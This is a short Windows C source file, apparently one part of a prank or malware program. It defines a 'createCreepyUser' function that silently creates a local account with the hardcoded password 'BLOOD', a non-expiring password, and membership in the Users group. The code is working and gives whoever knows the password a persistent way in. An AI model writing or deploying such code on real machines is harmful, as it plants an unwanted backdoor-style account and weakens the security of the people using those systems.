#include <windows.h>
#include <math.h>
#include <stdlib.h>
#include <lmaccess.h>
#include <lm.h>
#include <winnt.h>
#include <string.h>

#pragma comment(lib, "netapi32.lib");

#ifndef CREATE_CREEPY_USER
#define CREATE_CREEPY_USER

void createCreepyUser(LPWSTR username) {
    USER_INFO_1 ui;
    memset(&ui, 0, sizeof(ui));
    LPWSTR wideUsername;
    ui.usri1_name = username;
    ui.usri1_password = L"BLOOD";
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;
    NET_API_STATUS resultAdd = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (resultAdd != 0) {
        MessageBoxA(NULL, "Adding user failed", "Error", MB_OK);
        printf("Error code adding a new user: %d\n", resultAdd);
    }
    LOCALGROUP_MEMBERS_INFO_3 lmi3;
    ZeroMemory(&lmi3, sizeof lmi3);
    lmi3.lgrmi3_domainandname = ui.usri1_name;
    DWORD err = NetLocalGroupAddMembers(NULL, L"Users", 3, (LPBYTE) &lmi3, 1);
    if (err != 0) printf("error");
}

#endif